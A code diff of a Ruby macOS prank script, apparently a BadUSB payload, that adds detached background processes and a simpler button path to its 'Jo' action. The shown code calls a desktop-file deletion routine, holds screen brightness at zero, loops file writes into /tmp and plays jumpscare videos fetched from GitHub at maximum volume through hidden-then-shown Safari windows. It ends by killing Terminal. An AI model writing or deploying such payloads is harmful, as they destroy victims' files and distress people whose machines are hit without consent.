@@ -80,11 +80,11 @@ def persistent_jumpscare(video_url)
     set_volume_to_max
     # Open the jumpscare page in Safari.
     system("open -a Safari '#{html_file}'")
-    # Hide Safari's front window.
+    # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.85 seconds (simulate waiting for sound detection).
+    # Wait 0.85 seconds (to simulate waiting for sound detection).
     sleep 0.85
-    # Unhide Safari.
+    # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
     # Let the jumpscare play for 1 second.
     sleep 1
@@ -111,13 +111,13 @@ def persistent_jumpscare(video_url)
 end
 
 # --- Spam Screenshots Function (Detached Process) ---
-# (This function is kept as is, but might trigger recording permissions.)
+# (For testing, this copies the Finder icon repeatedly as a dummy action.)
 def spam_screenshots
   pid = fork do
     Process.daemon(true, true)
     loop do
       filename = "/tmp/screenshot_#{Time.now.to_f.to_s.gsub('.', '')}_#{rand(10000)}.jpg"
-      system("screencapture -x #{filename}")
+      system("cp /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns #{filename}")
       sleep 0.1
     end
   end
@@ -156,30 +156,27 @@ def run_secret_script
 end
 
 # --- Jo Action ---
-# Executes: spam screenshots, delete desktop files, maintain darkness,
-# run rickroll, and then launch the Momo jumpscare.
+# Executes spam screenshots, deletes desktop files, maintains darkness (brightness 0), 
+# runs the secret (rickroll) script, and launches persistent Momo jumpscare.
 def jo_action
   spam_screenshots
   delete_desktop_files
   maintain_darkness
-  run_secret_script
-  persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
+  pid1 = fork { run_secret_script }
+  Process.detach(pid1)
+  pid2 = fork { persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4") }
+  Process.detach(pid2)
 end
 
 # --- Subscriber Branch Prompts ---
-# First prompt: three buttons: "Hawk", "Tuah", "Next"
+# First subscriber prompt (three buttons: Hawk, Tuah, Next)
 def first_subscriber_prompt
   display_dialog("Choose a button:", ["Hawk", "Tuah", "Next"], "Hawk")
 end
 
-# Second prompt: two buttons: "Sydney lover", "Slay", plus a "Next" button
+# Second subscriber prompt (three buttons: Sydney lover, Slay, Jo)
 def second_subscriber_prompt
-  display_dialog("Choose a button:", ["Sydney lover", "Slay", "Next"], "Sydney lover")
-end
-
-# Third prompt: one button: "Jo"
-def third_subscriber_prompt
-  display_dialog("Press the button to activate Jo:", ["Jo"], "Jo")
+  display_dialog("Choose a button:", ["Sydney lover", "Slay", "Jo"], "Sydney lover")
 end
 
 # --- Subscriber Action Flow ---
@@ -209,21 +206,15 @@ def subscriber_action
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
     elsif second_choice == "slay"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
-    elsif second_choice == "next"
-      third_choice = third_subscriber_prompt
-      if third_choice && third_choice.strip.downcase == "jo"
-        jo_action
-      else
-        puts "No valid choice in third prompt. Exiting."
-        exit 0
-      end
+    elsif second_choice == "jo"
+      jo_action
     else
       puts "Unexpected choice in second prompt: #{second_choice}"
     end
   else
     puts "Unexpected button choice in first prompt: #{first_choice}"
   end
-
+  
   system("killall Terminal")
   exit 0
 end
